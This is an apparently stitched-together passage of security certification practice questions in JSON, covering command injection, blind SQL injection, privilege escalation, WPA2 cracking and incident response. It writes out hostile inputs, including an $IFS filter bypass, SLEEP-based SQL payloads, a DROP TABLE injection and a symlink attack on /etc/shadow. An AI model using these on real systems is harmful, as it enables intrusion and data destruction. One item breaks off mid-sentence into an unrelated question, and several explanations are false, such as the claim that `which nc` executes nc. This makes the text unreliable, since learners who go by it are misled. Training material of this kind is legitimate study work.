        "explanation": "While it's running a web server and SSH server, port 3306 (MySQL) is *closed*, meaning there's *no* evidence from this scan that MySQL is *running*. The `filtered` state on port 80 means Nmap couldn't determine if it's open or closed (likely due to a firewall). The most accurate conclusion is that it's *likely* a CentOS Linux server. This is based on the Apache version string `((CentOS))`. OpenSSH 7.4 is also commonly found on CentOS systems.  The presence of Apache and OpenSSH strongly suggests a Linux system, and the CentOS string makes that the most probable distribution.",
        "examTip": "Pay close attention to version strings reported by Nmap. They often provide clues about the operating system and specific software distributions used on the target system."
    },
    {
     "id": 59,
     "question": "You are analyzing a web application and discover a potential command injection vulnerability in a feature that allows users to ping a host. The application is written in PHP. The relevant code snippet is: `$ip = $_GET['ip']; system(\"ping -c 4 \" . $ip);`. The application filters spaces and semicolons. Which of the following payloads is MOST likely to successfully exploit this vulnerability and execute the `id` command *without* using spaces or semicolons?",
    "options":[
       "a) `127.0.0.1;id`",
       "b) `127.0.0.1 && id`",
       "c) `127.0.0.1$IFS&&$IFS'id'`",
       "d) `127.0.0.1|id`"
    ],
     "correctAnswerIndex": 2,
     "explanation": "Semicolons and spaces are filtered, eliminating (a) and (b). Using a pipe (`|`) might work in *some* cases, but is less reliable than leveraging Bash's internal field separator. The correct payload is `127.0.0.1$IFS&&$IFS'id'`.  `$IFS` represents the Internal Field Separator (which defaults to space, tab, and newline). `&&` is a command separator. This payload effectively becomes `127.0.0.1 && id`, bypassing the space and semicolon restrictions and executing the `id` command.",
     "examTip": "When facing command injection filters, utilize shell metacharacters and environment variables like `$IFS` to bypass restrictions on spaces and other common characters."
    },
    {
        "id": 60,
        "question": "You are performing a wireless penetration test and have captured a WPA2-PSK four-way handshake. You are using `aircrack-ng` to crack the PSK. You have a wordlist, but you also know that the target organization's SSID is 'CorpWiFi'.  How can you use this SSID information to potentially *speed up* the cracking process?",
        "options": [
           "a) Use the SSID as the password.",
            "b) The SSID is irrelevant to the cracking process.",
            "c) Use the ESSID to generate PMKID.",
            "d) Use a tool like `hcxpcapngtool` to convert the capture to a hashcat-compatible format, leveraging the known ESSID to precompute part of the handshake.",
        ],
        "correctAnswerIndex": 3,
        "explanation": "The SSID is *not* the password. The ESSID and PMKID are related. The SSID (ESSID) is a *part* of the input used to generate the Pairwise Master Key (PMK) during the WPA2 handshake. Tools like `hcxpcapngtool` (part of the `hcxtools` suite) can convert the captured handshake (usually in `.cap` or `.pcap` format) into a format compatible with `hashcat` (specifically, the `-m 22000` mode).  Crucially, `hcxpcapngtool` can leverage the *known* ESSID to *precompute* part of the handshake calculation, significantly speeding up the cracking process in `hashcat`.",
        "examTip": "When cracking WPA2-PSK, knowing the ESSID (network name) can significantly speed up the process by allowing precomputation of part of the handshake using tools like `hcxpcapngtool` and `hashcat`."
    },
    {
    "id": 61,
     "question": "You have obtained a low-privilege shell on a Linux system. You suspect there might be a SUID binary that could be exploited for privilege escalation. Which command is the MOST efficient and comprehensive for finding *all* SUID binaries on the system?",
     "options":[
      "a) `ls -l /usr/bin`",
      "b) `find / -perm -4000 -type f 2>/dev/null`",
      "c) `find / -perm /u=s -type f 2>/dev/null`",
      "d) Both B and C"
     ],
     "correctAnswerIndex": 3,
     "explanation": "`ls -l /usr/bin` only checks one directory, not the entire filesystem. `find / -perm -4000 -type f 2>/dev/null` using the numerical representation for SUID bit is good but can also be written as c. The most *precise* and efficient command is b and c. `find /` searches the entire filesystem. `-perm /u=s` finds files with the SUID bit *set*. `-type f` restricts the search to regular files. `2>/dev/null` suppresses error messages (e.g., "Permission denied" errors when searching restricted directories).",
     "examTip": "Use `find / -perm /u=s -type f 2>/dev/null` (or its numeric equivalent) to locate all SUID binaries on a Linux system, a crucial step in privilege escalation reconnaissance."
    },
    {
    "id": 62,
    "question": "You are analyzing a web application that uses session cookies. After logging in, you observe the following `Set-Cookie` header in the server's response: `Set-Cookie: sessionid=1234567890abcdef; Path=/`.  What is the PRIMARY security concern based SOLELY on this header?",
    "options":[
      "a) The cookie is not marked as HttpOnly, making it vulnerable to XSS.",
      "b) The cookie is not marked as Secure, allowing it to be transmitted over unencrypted connections.",
      "c) The cookie has a broad scope (Path=/), making it accessible to all paths on the domain.",
      "d) The cookie value is short"
    ],
     "correctAnswerIndex": 2,
     "explanation": "While the *absence* of `HttpOnly` and `Secure` are *major* security concerns, they are not *directly* visible in the provided header. The header shows `Path=/`.  This means the cookie is valid for *all paths* on the domain.  This is a security concern because it increases the *attack surface*.  If *any* part of the website (even a less-secure section) has a vulnerability (e.g., XSS), that vulnerability could be used to steal the session cookie, even if the main application is secure. A more secure approach would be to restrict the cookie's scope to a specific path (e.g., `Path=/admin`) if it's only needed for that section.",
     "examTip": "The `Path` attribute in the `Set-Cookie` header controls the cookie's scope.  A broad scope (`Path=/`) increases the risk of the cookie being exposed through vulnerabilities in other parts of the website."

    },
    {
      "id": 63,
        "question": "You have successfully exploited a command injection vulnerability in a web application. The application is running on a Linux server, and you have a limited shell. You want to determine if the `nc` (Netcat) utility is available on the system *without* directly executing `nc` (which might trigger alerts or be blocked). Which command is the MOST reliable and stealthy way to check for the presence of `nc`?",
      "options":[
        "a) `which nc`",
        "b) `type nc`",
        "c) `command -v nc`",
        "d) `hash -r; nc`"
      ],
      "correctAnswerIndex": 2,
      "explanation": "`which nc` searches the `PATH` and *executes* `nc` if found (which we want to avoid). `type nc` is a Bash built-in, but it also *executes* `nc` to determine its type.  `hash -r; nc` *definitely* executes `nc`. The *most reliable and stealthy* method is `command -v nc`.  `command -v` is a POSIX-compliant way to check if a command exists *without* actually executing it. It simply returns the path to the command if it's found, or nothing if it's not.  It doesn't trigger the execution of `nc` itself.",
      "examTip": "Use `command -v <command>` to reliably check for the existence of a command on a Linux system *without* executing it. This is a stealthier alternative to `which` or `type`."
    },
    {
        "id": 64,
        "question": "You are analyzing a web application and suspect it might be vulnerable to Cross-Site Request Forgery (CSRF). The application uses POST requests for sensitive actions. You intercept a legitimate POST request and want to test if removing the `Referer` header allows the request to succeed. Which tool and specific feature is BEST suited for this task?",
        "options":[
            "a) Burp Suite Repeater, modifying the request directly.",
            "b) Burp Suite Intruder, using a null payload.",
            "c) OWASP ZAP, using the 'Resend' feature with header modification.",
            "d) Nmap with NSE script."
        ],
        "correctAnswerIndex": 0,
        "explanation": "Burp Suite Intruder is for automated attacks with multiple payloads. OWASP ZAP's 'Resend' is similar to Burp Suite Repeater. Nmap is not designed for this. Burp Suite Repeater is *specifically designed* for manually modifying and replaying individual HTTP requests.  You can intercept the request, send it to Repeater, remove (or modify) the `Referer` header, and then resend the request to observe the server's response. This allows for precise testing of the impact of header modifications.",
        "examTip": "Burp Suite Repeater is the ideal tool for manually modifying and replaying HTTP requests, allowing for controlled testing of specific parameters and headers, such as the `Referer` header in CSRF testing."
    },
    {
        "id": 65,
        "question": "You're performing a penetration test against a web application that uses a weak CAPTCHA mechanism. You've written a Python script to automatically solve the CAPTCHA and submit a large number of requests. However, after a few successful submissions, your script starts receiving HTTP 429 (Too Many Requests) errors. What is the MOST effective technique to bypass this rate limiting and continue your automated testing?",
        "options":[
           "a) Increase the delay between requests in your script.",
           "b) Use a different user agent for each request.",
           "c) Use a pool of IP addresses (e.g., through proxies or a VPN) and rotate them for each request.",
           "d) Use multiple threads"
        ],
        "correctAnswerIndex": 2,
        "explanation": "Increasing the delay *might* work, but it significantly slows down the testing. Changing the user agent is unlikely to bypass rate limiting based on IP address. Using multiple threads will make it worst. The most effective approach is to use a *pool of IP addresses*.  Rate limiting is often implemented based on the client's IP address. By rotating through different IP addresses, you can effectively circumvent the rate limit, making it appear as if the requests are coming from different sources.",
        "examTip": "To bypass IP-based rate limiting during automated testing, use a pool of IP addresses and rotate them for each request.  Proxies and VPNs are common tools for achieving this."
    },
        {
        "id": 66,
         "question": "You are analyzing the following Apache web server configuration snippet:\n```apache\n<Directory /var/www/uploads>\n Require all denied\n <FilesMatch \"\\.ph(p[345]?|t|tml)$\">\n Require all denied\n </FilesMatch>\n</Directory>\n```\nWhat is the PRIMARY security purpose of this configuration, and what is a potential bypass technique that could be used if the server is misconfigured?",
         "options":[
           "a) To prevent access to all files in the /var/www/uploads directory, Bypassed by uploading files to other folder",
           "b) To prevent execution of PHP files in the `/var/www/uploads` directory, Bypassed using double extensions",
           "c) To prevent directory listing; Bypassed using index.php.",
           "d) To prevent access to specific file; Bypassed by changing the extension."
         ],
        "correctAnswerIndex": 1,
        "explanation": "The configuration *denies* access to all files (`Require all denied`) within the `/var/www/uploads` directory. The `<FilesMatch>` directive further *specifically* denies access to files with extensions that *look like* PHP files (e.g., `.php`, `.php3`, `.php4`, `.php5`, `.pht`, `.phtml`). This is a security measure to prevent attackers from uploading and executing PHP webshells. A potential bypass, *if the server is misconfigured*, is to use *double extensions*.  For example, if the server is configured to execute files with a `.php` extension *regardless* of other extensions, uploading a file named `shell.php.jpg` might bypass the filter (which only checks for specific extensions) but still be executed as PHP.",
        "examTip": "Web server configurations often restrict access to upload directories to prevent the execution of malicious scripts. Double extensions (e.g., `shell.php.jpg`) are a common bypass technique if the server's configuration is not sufficiently strict."
    },
    {
    "id": 67,
     "question": "You have compromised a Linux system and are performing privilege escalation. You discover a cron job that runs a script as root. The script contains the following line: `cp /home/user/data.txt /var/backups/`. The `/home/user/` directory is writable by your current user. What is the MOST reliable and stealthy way to exploit this for privilege escalation?",
     "options":[
      "a) Replace data.txt with a SUID binary and wait to be executed.",
      "b) Create a symbolic link named `data.txt` pointing to `/etc/shadow`, then wait for the cron job to run.",
      "c) Create a hard link for data.txt and wait.",
      "d) Modify data.txt to include sudo command."
     ],
     "correctAnswerIndex": 1,
     "explanation": "Replacing `data.txt` with a SUID binary won't work because the `cp` command *copies* the file *content*, not the file attributes (including the SUID bit). Modifying `data.txt` won't give you higher privileges. The key is to use a *symbolic link*.  Create a symbolic link named `data.txt` that points to `/etc/shadow`. When the cron job runs (as root), it will *copy the contents* of `/etc/shadow` (because it follows the symlink) to `/var/backups/`.  You can then read `/var/backups/data.txt` to obtain the password hashes. This is a classic symbolic link attack.",
     "examTip": "Symbolic link attacks are powerful in scenarios where a privileged process (like a cron job running as root) interacts with files in a user-writable directory. You can trick the process into reading or writing to arbitrary files."
    },
    {
        "id": 68,
        "question": "You are analyzing a web application and discover a potential SQL injection vulnerability in a `WHERE` clause. The application uses a backend database that supports time-based blind SQL injection techniques. You want to extract the database version, one character at a time. Assuming you have already confirmed the basic injection, which of the following payloads, combined with appropriate timing analysis, is MOST efficient and reliable for extracting the *third* character of the database version?",
        "options":[
           "a) `' AND (SELECT SLEEP(5) FROM dual WHERE SUBSTR((SELECT @@version),3,1)='a') AND '1'='1`",
           "b) `' AND (SELECT CASE WHEN (ASCII(SUBSTR((SELECT @@version),3,1))=97) THEN SLEEP(5) ELSE 0 END) AND '1'='1`",
           "c) ` OR 1=1; SELECT SLEEP(5);--`",
           "d) ` AND SLEEP(5)--`"
        ],
        "correctAnswerIndex": 1,
        "explanation": "Option (c) is attempting a stacked query, which may not be supported and isn't necessary for blind SQLi. (d) just causes a delay, not extracting any information. (a) is .g., an extra character or a different domain extension). What type of attack is MOST likely occurring, and what should the user do immediately?",
  "options":[
     "Cross-site scripting (XSS); the user should clear their browser's cookies and cache.",
     "Session hijacking or a man-in-the-middle (MitM) attack; the user should immediately change their password for the affected account, check for HTTPS and a valid certificate, and avoid using the site until the issue is resolved.",
      "SQL injection; the user should scan their computer for malware.",
      "Denial-of-service (DoS); the user should report the issue to their internet service provider."
   ],
  "correctAnswerIndex": 1,
   "explanation":
      "This is not XSS (which involves injecting scripts into a legitimate website), SQL injection (which targets databases), or DoS (which aims to disrupt service). The repeated credential prompts and the *slightly different URL* are strong indicators of either *session hijacking* or a *man-in-the-middle (MitM)* attack:
     *   **Session Hijacking:** An attacker may have stolen the user's session ID (e.g., through XSS, network sniffing, or malware) and is attempting to use it to access the user's account. The repeated prompts could indicate that the attacker and the legitimate user are both trying to use the same session, causing conflicts.
      *    **Man-in-the-Middle (MitM):** An attacker may have positioned themselves between the user and the legitimate website, intercepting their communication. The attacker could be presenting the user with a *fake login page* (part of a phishing attack) to steal their credentials, or they could be modifying the legitimate website's content to steal information or inject malware. The different URL suggests the user is *not* communicating directly with the legitimate site.

     The user should take the following immediate actions:
      1.  *Stop using the website immediately*. Do not enter any more information.
   2. *Change the password* for the affected account (and any other accounts where the user might have reused the same password).
     3. *Check for HTTPS and a valid certificate*:  Ensure that the website is using HTTPS (the URL starts with `https://` and there's a padlock icon in the address bar). Click on the padlock icon to view the website's security certificate and verify that it is issued to the *correct domain name* and by a *trusted certificate authority*.  If the site is not using HTTPS, or if the certificate is invalid or issued to a different domain, it's a strong indication of a MitM attack or a phishing site.
   4.    *Run a full system scan* with reputable anti-malware software to check for malware that might have been installed through a drive-by download.
   5.  *Clear browser cookies and cache.*
   6.   *Report the incident* to the legitimate website's security team and potentially to law enforcement.",
   "examTip": "Repeated login prompts and a suspicious URL can indicate session hijacking or a MitM attack; check for HTTPS and a valid certificate, and change your password immediately."
},
{
     "id": 36,
 "question": "You are investigating a suspected data breach and need to determine if any files were modified on a Linux system after a specific date and time. Which of the following commands, with appropriate options, would be MOST effective for this task?",
  "options": [
  "ls -l",
 "find / -type f -newerct 'YYYY-MM-DD HH:MM:SS'",
   "grep -r \"modification\" /var/log",
    "du -h"
   ],
   "correctAnswerIndex": 1,
 "explanation":
    "`ls -l` lists files and their details, but it's not efficient for searching by modification time across the entire filesystem. `grep -r` searches for text *within* files, not file metadata. `du -h` shows disk usage. The `find` command is a powerful tool for locating files based on various criteria. The command `find / -type f -newerct 'YYYY-MM-DD HH:MM:SS'` would be used, with a correctly formatted date.
   *   `find /`: Starts the search from the root directory (`/`), searching the *entire filesystem*.
   * `-type f`: Specifies that we're looking for *files* (not directories, links, etc.).
    *   `-newerct 'YYYY-MM-DD HH:MM:SS'`: This is the key part. It filters for files whose *ctime* (inode change time, which includes modification time *and* metadata changes) is *newer than* (more recent than) the specified date and time. Replace `YYYY-MM-DD HH:MM:SS` with the actual date and time you're interested in (e.g., `2024-10-28 10:00:00`).

     This command will list all *files* on the system that have been *created or modified* after the specified date and time. You can further refine this command by specifying a starting directory other than `/` (to narrow the search) or by adding other criteria (e.g., `-name` to search for files with specific names).",
   "examTip": "Use the `find` command with `-newerct` (or `-newermt` for modification time only) to locate files modified after a specific date and time on Linux."
},
{
     "id": 37,
   "question": "A security analyst is examining a Windows system and suspects that a malicious process is running. They want to see a list of all running processes along with their associated *network connections*, including the local and remote IP addresses and ports. Which built-in Windows tool provides the MOST comprehensive view of this information?",
 "options": [
  "Task Manager",
   "Resource Monitor",
   "Command Prompt (using `netstat`)",
   "Windows Firewall"
 ],
 "correctAnswerIndex": 1,
   "explanation":
   "Task Manager provides a *basic* view of running processes and network activity, but it doesn't show detailed connection information for *each process*. The Command Prompt with `netstat` can show network connections, but Resource Monitor provides a more user-friendly and comprehensive view. Windows Firewall is for configuring firewall rules, not for monitoring active connections. *Resource Monitor* (resmon.exe), accessible from Task Manager (Performance tab -> Open Resource Monitor) or by running `resmon` directly, provides a detailed, real-time view of system resource usage, including network activity. Specifically, the *Network* tab in Resource Monitor shows:
    *  A list of processes with network activity.
    *   The *local address and port* used by each process.
      *    The *remote address and port* each process is connected to.
 *  The amount of data being sent and received by each process.
     *   TCP connections and Listening Ports

  This makes it easy to identify which processes are responsible for network communication and to investigate suspicious connections.",
 "examTip": "Use Resource Monitor (resmon.exe) on Windows to view detailed, process-level network activity."
},
{
   "id": 38,
  "question": "You are analyzing a potentially malicious executable file and want to examine its *static properties* without actually running it. Which of the following techniques would provide the MOST comprehensive information about the file's internal structure, imported functions, and potential capabilities?",
  "options": [
     "Using the `strings` command to extract printable strings from the file.",
    "Performing static analysis using a disassembler (e.g., IDA Pro, Ghidra), a PE header parser (e.g., PEview, CFF Explorer), and potentially a decompiler.",
    "Scanning the file with a single antivirus engine.",
   "Opening the file in a hex editor to view its raw byte content."
     ],
   "correctAnswerIndex": 1,
  "explanation":
 "The `strings` command extracts printable strings, which can provide *some* clues, but it's limited. A *single* antivirus engine might not detect all malware. A hex editor shows the raw bytes, but doesn't interpret the code structure. *Static analysis* involves examining the file *without executing it*. This is done using a combination of tools:
     * **Disassembler (e.g., IDA Pro, Ghidra, Hopper):** Converts the machine code (binary instructions) into assembly language, a human-readable representation of the instructions. This allows you to analyze the program's logic, identify functions, and understand how it might work.
   * **PE Header Parser (e.g., PEview, CFF Explorer):**  Analyzes the *PE (Portable Executable) file header*, which is the standard format for executables on Windows. The PE header contains important information about the file, including:
   *    Imported functions (functions the program calls from external libraries – this can reveal its capabilities, e.g., network communication, file system access, registry manipulation).
    *    Exported functions (functions the program provides to other programs).
     * Sections (.text, .data, .rsrc, etc.) and their characteristics.
  *   Compilation timestamps.
   *  Digital signature information (if present).
     * **Decompiler (if available):**  Attempts to reconstruct higher-level source code (e.g., C, C++) from the disassembled code. This can make the code even easier to understand, but decompilers are not always perfect and may not work for all types of executables.

    Combining these techniques provides a deep understanding of the file's structure, potential functionality, and indicators of compromise (IoCs) *without* the risk of executing it.",
"examTip": "Static analysis using disassemblers, PE header parsers, and decompilers provides deep insights into an executable's structure and potential behavior without running it."
},
{
  "id": 39,
   "question": "Which of the following is the MOST effective approach for mitigating the risk of 'DNS hijacking' or 'DNS spoofing' attacks?",
  "options": [
   "Using strong, unique passwords for all DNS server administrator accounts.",
  "Implementing DNSSEC (Domain Name System Security Extensions) and validating DNS responses.",
     "Using a firewall to block all incoming UDP traffic on port 53.",
   "Conducting regular penetration testing exercises."
    ],
 "correctAnswerIndex": 1,
   "explanation":
    "Strong passwords protect the *DNS server itself* from compromise, but don't prevent DNS spoofing attacks against clients. Blocking *all* UDP traffic on port 53 would prevent *all* DNS resolution. Penetration testing can *identify* vulnerabilities, but doesn't *prevent* attacks. *DNS spoofing* (also known as DNS cache poisoning) and *DNS hijacking* are attacks where an attacker corrupts the DNS resolution process to redirect users to malicious websites. The *most effective* defense is *DNSSEC (Domain Name System Security Extensions)*. DNSSEC adds *digital signatures* to DNS data to ensure its *authenticity and integrity*. When DNSSEC is implemented:
  *   DNS resolvers can *verify* that the DNS responses they receive are legitimate and have not been tampered with.
  *   Attackers cannot forge DNS responses to redirect users to malicious sites.

   DNSSEC prevents attackers from hijacking the DNS resolution process.",
"examTip": "DNSSEC is the primary defense against DNS spoofing and hijacking; it uses digital signatures to ensure the integrity of DNS data."
},
{
  "id": 40,
 "question": "You are investigating a potential security incident and have collected numerous log files from different systems (web servers, firewalls, intrusion detection systems, etc.). What is the MOST significant challenge in effectively analyzing these logs, and what technology or approach is BEST suited to address this challenge?",
   "options": [
  "The challenge is encrypting the log files; the best approach is to use full-disk encryption.",
     "The challenge is correlating events across multiple log sources with different formats and timestamps; the best approach is to use a SIEM (Security Information and Event Management) system.",
   "The challenge is backing up the log files; the best approach is to use a cloud storage service.",
"The challenge is deleting old log files; the best approach is to use a log rotation utility."
    ],
"correctAnswerIndex": 1,
   "explanation":
    "Encryption protects log *confidentiality*; backup is for data protection; log rotation is for manageability. The *most significant challenge* in analyzing logs from *multiple sources* is *correlation*. Different systems and applications:
     *   Use *different log formats*.
   *   Have *different timestamps* (if not synchronized).
   *  Record *different types of events*.

 It can be extremely difficult and time-consuming to manually piece together a coherent picture of an incident by looking at these disparate logs in isolation. A *Security Information and Event Management (SIEM)* system is specifically designed to address this challenge. SIEM systems:
   *  **Collect and Aggregate Logs:** Collect logs from a wide variety of sources across the network.
  *   **Normalize and Parse Logs:** Convert logs from different formats into a common, standardized format.
    *   **Correlate Events:** Identify relationships between events across different log sources and systems. For example, a firewall log showing a blocked connection attempt might be correlated with a web server log showing a failed login attempt and an IDS log showing a known exploit signature, all within a short timeframe.
   *   **Alert on Suspicious Activity:** Generate alerts based on predefined rules and correlation logic.
    *    **Provide Search and Reporting Capabilities:** Allow analysts to search for specific events, create reports, and visualize log data.

   SIEM systems significantly improve the efficiency and effectiveness of log analysis and incident response.",
"examTip": "SIEM systems are essential for correlating events across multiple log sources and detecting complex attack patterns."
},
{
  "id": 41,
    "question": "What is the primary purpose of 'input validation' in secure coding practices, and why is it so critical for preventing web application vulnerabilities?",
    "options":[
     "To encrypt user input before storing it in a database, ensuring data confidentiality.",
    "To thoroughly check and sanitize all user-supplied data to prevent attackers from injecting malicious code or manipulating application logic.",
    "To automatically log users out of a web application after a period of inactivity, preventing session hijacking.",
      "To enforce strong password policies, requiring users to create complex and unique passwords."
   ],
"correctAnswerIndex": 1,
    "explanation":
 "Input validation is *not primarily* about encryption, automatic logouts, or password strength (though those are important security considerations). Input validation is a *fundamental* security practice that is *absolutely critical* for preventing a wide range of web application vulnerabilities, especially *injection attacks* (like SQL injection, cross-site scripting (XSS), and command injection). It involves *rigorously checking and sanitizing* *all data* received from users (through web forms, API calls, URL parameters, cookies, HTTP headers, etc.) *before* it is used by the application. This includes:
  *   **Data Type Validation:** Ensuring that the input data conforms to the *expected data type* (e.g., integer, string, date, boolean).
    *  **Length Constraints:** Enforcing minimum and maximum length restrictions on input data.
 *    **Character Set Validation:** Restricting input to an *allowed set of characters* (e.g., alphanumeric characters only, or a specific set of allowed special characters).
     *    **Format Validation:** Verifying that the input data matches an *expected format* (e.g., email address format, phone number format, date format).
   *    **Range Validation:** Checking that numerical input falls within an acceptable range.
    *   **Sanitization/Escaping:** Removing or escaping potentially dangerous characters or sequences (e.g., converting `<` to `<` in HTML output to prevent XSS).
   *  **Whitelisting vs. Blacklisting:** Preferably using a *whitelist* approach (allowing only known-good input) rather than a *blacklist* approach (blocking known-bad input), as blacklists are often incomplete and can be bypassed.

   By thoroughly validating and sanitizing all user input, you can prevent attackers from injecting malicious code or manipulating the application's logic, significantly reducing the risk of many common web application vulnerabilities.",
"examTip": "Input validation is the first line of defense against injection attacks and many other web application vulnerabilities; always validate and sanitize *all* user input."
},

{
   "id": 42,
  "question": "A security analyst is examining a Windows system and suspects that a malicious process is attempting to hide its network connections. Which of the following techniques is the attacker MOST likely using, and which tool would be BEST suited to detect this?",
   "options":[
    "The attacker is likely using a firewall to block network connections; the Windows Firewall configuration should be reviewed.",
   "The attacker is likely using a rootkit or other advanced techniques to hide network connections from standard tools; a kernel-mode rootkit detector or memory forensics toolkit (e.g., Volatility) would be most effective.",
   "The attacker is likely using a VPN to encrypt network traffic; a packet analyzer like Wireshark should be used.",
  "The attacker is likely using a proxy server to redirect network traffic; the system's proxy settings should be checked."
    ],
"correctAnswerIndex": 1,
   "explanation":
   "A firewall *blocks* connections, it doesn't *hide* them. A VPN *encrypts* traffic, but the connections would still be visible (though the content would be obscured).  A proxy *redirects* traffic, but the connections would still be visible (though they might point to the proxy server instead of the final destination). If a malicious process is *hiding* its network connections, it means that standard tools like `netstat`, Resource Monitor, or even Task Manager *do not show* those connections. This strongly suggests the use of *advanced techniques* to evade detection, most likely a *rootkit*. Rootkits, especially *kernel-mode rootkits*, operate at a very low level of the operating system (the kernel) and can:
   *  *Hook system calls*: Intercept and modify the results of system calls (like those used to list network connections) to hide the malicious process's activity.
  *   *Modify kernel data structures*: Directly alter the data structures used by the operating system to track network connections, making the malicious connections invisible to standard tools.

 Therefore, detecting hidden network connections in this scenario requires tools that operate *below* the level of the potentially compromised operating system:
  * **Kernel-Mode Rootkit Detectors:** These tools are specifically designed to identify rootkits by analyzing the system's kernel memory, comparing it against known-good states, and looking for modifications and inconsistencies.
     *   **Memory Forensics Toolkits (e.g., Volatility):** These tools allow you to analyze a *memory dump* (a snapshot of the system's RAM) of the potentially compromised system. By examining the memory directly, you can bypass the potentially compromised operating system and identify hidden processes, network connections, and other artifacts that might not be visible through standard system tools.",
   "examTip": "Rootkits can hide network connections from standard tools; use kernel-mode detectors or memory forensics for reliable detection."
},
{
    "id": 43,
  "question": "You are investigating a potential cross-site scripting (XSS) vulnerability in a web application. Which of the following characters or sequences of characters, if present in user input and *not* properly handled by the application, would be MOST indicative of a potential XSS vulnerability?",
 "options":[
 "Single quotes (`'`) and double quotes (`\"`)",
   "Angle brackets (`<` and `>`), and potentially encoded versions like `<` and `>`",
   "Semicolons (`;`) and hyphens (`--`)",
"Periods (`.`) and commas (`,`)",
  ],
 "correctAnswerIndex": 1,
   "explanation":
"Single and double quotes are more critical for SQL injection. Semicolons and hyphens are important in SQL. Periods and commas are generally not dangerous in this context. *Angle brackets (`<` and `>`) are the MOST concerning characters in the context of XSS*, along with their *encoded versions* (`<` and `>` if not properly handled).  XSS involves injecting malicious *scripts* (usually JavaScript) into a web page. These scripts are typically enclosed within HTML tags, and the most common tag used for scripting is `<script>`. If a web application doesn't properly *sanitize* or *encode* user input before displaying it, an attacker can inject `<script>` tags (and other HTML tags) containing malicious code.  The browser, trusting the website, will then execute this code.  Even if the application *filters* `<` and `>`, attackers might try to bypass this by using *HTML entities* (`<` for `<`, `>` for `>`).  A vulnerable application might decode these entities *before* displaying the output, effectively re-injecting the `<` and `>` characters and allowing the script to execute. Other important characters include:
     *  `"` (double quote) and `'` (single quote) - Used to delimit attribute values within HTML tags.
    * `&` - Can introduce HTML entities
    * `()` - Used in Javascript
    ",
   "examTip": "Angle brackets (`<` and `>`), quotes, ampersands, and their encoded equivalents are key indicators of potential XSS vulnerabilities if not properly handled."
},
{
    "id": 44,
 "question": "A user reports receiving an email claiming to be from their bank, warning them about unusual activity on their account. The email contains a link and urges the user to click it to verify their account details *immediately*. What type of attack is MOST likely being attempted, and what is the user's BEST course of action?",
 "options":[
    "A legitimate security notification from the bank; the user should click the link and follow the instructions.",
    "A phishing attack; the user should not click the link, report the email as phishing, and contact their bank directly through official channels (not using any information from the email).",
   "A denial-of-service (DoS) attack; the user should forward the email to their IT department.",
  "A cross-site scripting (XSS) attack; the user should reply to the email and ask for clarification."
   ],
 "correctAnswerIndex": 1,
  "explanation":
 "Banks *rarely* (if ever) send emails requesting users to click links to verify account details, especially with a sense of urgency. This is not a DoS or XSS attack. This scenario describes a classic *phishing* attack. The attacker is impersonating the bank to trick the user into revealing their account credentials or other sensitive information. Key indicators of phishing include:
    *   **Sense of Urgency:** The email urges *immediate* action, creating a sense of panic and reducing the user's likelihood of thinking critically.
   *  **Suspicious Link:** The email includes a link that likely leads to a *fake website* that mimics the bank's login page.
    *  **Generic Greeting:** Often lacks personalization
    *  **Grammatical Errors:** Often has grammar and spelling mistakes.
  *  **Request for sensitive data:** Asks for sensitive information.
  * **Unoffical Email Domain**: Email is not from the official domain.
  The user's *best course of action* is:
  1.   *Do not click the link* in the email.
   2.  *Report the email* as phishing (to their email provider and potentially to the bank).
   3.  *Contact the bank directly*, using a *known, trusted phone number or website address* (obtained from a bank statement, the bank's official website, or a phone book – *not* from the email itself).
    4.    If the user *did* click the link and enter any information, they should *immediately change their password* for the affected account (and any other accounts where they used the same password) and monitor their account for suspicious activity.",
"examTip": "Be extremely suspicious of emails with urgent requests, suspicious links, and requests for personal information; always contact the organization through official channels."
},
{
  "id": 45,
   "question": "You are analyzing network traffic using Wireshark and want to identify potential 'command and control (C2)' communication from a compromised host. Which of the following Wireshark display filters, used in combination, would be MOST effective in isolating *potentially* suspicious traffic patterns associated with C2?",
 "options":[
  "tcp.port == 80",
    "ip.src == internal_host_ip && (http.request || tls.handshake.type == 1) && (http.content_type contains \"application\" || (tcp.flags.push == 1 && tcp.len > 100))",
 "tcp.flags.syn == 1",
 "ip.addr == external_ip"
    ],
"correctAnswerIndex": 1,
    "explanation":
   "Filtering solely on `tcp.port == 80` is insufficient, as it will capture all HTTP traffic, much of which is likely legitimate. `tcp.flags.syn == 1` only shows SYN packets (connection attempts), not ongoing communication. `ip.addr == external_ip` would show *all* traffic to/from a specific external IP, without context.

   A more effective approach involves combining multiple filters to identify *potentially* suspicious patterns associated with C2 traffic. Option 2, while complex, targets several key indicators:
   * `ip.src == internal_host_ip`: Focuses on traffic *originating from* the suspected compromised internal host.
 *   `(http.request || tls.handshake.type == 1)`: Looks for either HTTP requests *or* the initial Client Hello in a TLS handshake (this catches both unencrypted and encrypted C2 traffic that *starts* like HTTP/HTTPS). Many C2 frameworks use HTTP/HTTPS for communication.
 * `(http.content_type contains \"application\" || (tcp.flags.push == 1 && tcp.len > 100))`: This attempts to identify potentially unusual data transfers. It looks for:
    *  HTTP traffic with a `Content-Type` that includes "application" (e.g., `application/json`, `application/octet-stream`), which might be used to transport encoded C2 data.
  * OR
        *   TCP packets with the PUSH flag set *and* a segment length greater than 100 bytes. The PSH flag indicates that the data should be delivered immediately, and a larger segment size might suggest data exfiltration or command transmission.

     This combination of filters is designed to:
     1.  Focus on traffic originating from the *suspected compromised host*.
     2.    Identify traffic that *resembles* HTTP or HTTPS (to blend in with normal traffic), as many C2 frameworks use these protocols.
  3. Look for *potentially unusual data transfers* within that traffic (content type or PSH flag with larger data size).

     It's important to emphasize that this filter is not *definitive proof* of C2 communication. It's a starting point for identifying *potentially* suspicious traffic that warrants further investigation. Legitimate applications might also exhibit some of these characteristics. The analyst would need to further analyze the identified traffic, investigate the destination IPs/domains, and examine the process on the internal host responsible for the communication to determine if it's truly malicious.",
    "examTip": "Detecting C2 traffic often involves combining multiple Wireshark filters to identify suspicious patterns, such as unusual HTTP/HTTPS traffic originating from a compromised host."
},
{
 "id": 46,
   "question": "A web application accepts user input and directly incorporates it into an SQL query without proper sanitization or escaping. An attacker provides the following input:

   Input:
     `'; DROP TABLE users; --`

  What type of attack is this, what is the attacker attempting to do, and what is the MOST effective way to prevent this type of attack?",
   "options": [
    "Cross-site scripting (XSS); the attacker is attempting to inject malicious scripts into the website.",
    "SQL injection; the attacker is attempting to delete the `users` table from the database.",
 "Denial-of-service (DoS); the attacker is attempting to make the website unavailable.",
    "Directory traversal; the attacker is attempting to access files outside the webroot."
  ],
  "correctAnswerIndex": 1,
